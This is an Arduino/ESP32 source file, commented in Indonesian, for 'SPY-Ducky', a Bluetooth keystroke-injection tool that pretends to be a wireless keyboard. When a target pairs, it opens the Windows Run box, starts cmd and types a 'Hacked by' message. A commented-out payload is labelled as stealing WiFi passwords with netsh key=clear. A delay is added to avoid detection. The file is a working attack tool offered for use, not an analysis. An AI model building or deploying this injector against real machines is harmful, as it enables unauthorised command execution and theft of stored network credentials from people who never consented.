/*
 * PROJECT : SPY-Ducky (Bluetooth HID Injector)
 * BRAND   : SPY-E & 123Tool
 * AUTHOR  : Rolandino
 */

#include <BleKeyboard.h>

// Nama perangkat yang akan muncul di Bluetooth target
BleKeyboard bleKeyboard("SPY-E Keyboard", "123Tool Inc", 100);

void setup() {
  Serial.begin(115200);
  Serial.println("[*] Memulai SPY-Ducky...");
  bleKeyboard.begin();
}

// Fungsi untuk menjalankan Payload (Contoh: Buka CMD & Ketik Pesan)
void runPayload() {
  Serial.println("[+] Menjalankan Payload...");
  
  // 1. Buka Run Command (Windows + R)
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  // 2. Ketik CMD
  bleKeyboard.print("cmd");
  delay(100);
  bleKeyboard.write(KEY_RETURN);
  delay(1000);

  // 3. Ketik Perintah (Contoh: Menampilkan Pesan dari SPY-E)
  bleKeyboard.print("echo Hacked by SPY-E & 123Tool. This is a security test.");
  bleKeyboard.write(KEY_RETURN);
  delay(500);
  
  // Contoh Payload mencuri password WiFi (Windows)
  // bleKeyboard.print("netsh wlan show profile name=* key=clear");
  // bleKeyboard.write(KEY_RETURN);

  Serial.println("[+] Payload Terkirim!");
}

void loop() {
  if(bleKeyboard.isConnected()) {
    Serial.println("[!] Target Terhubung!");
    delay(2000); // Tunggu target siap
    
    runPayload();
    
    Serial.println("[*] Tugas selesai. Memutuskan koneksi untuk keamanan...");
    delay(30000); // Tunggu 30 detik sebelum bisa mengirim lagi agar tidak terdeteksi spam
  }
}
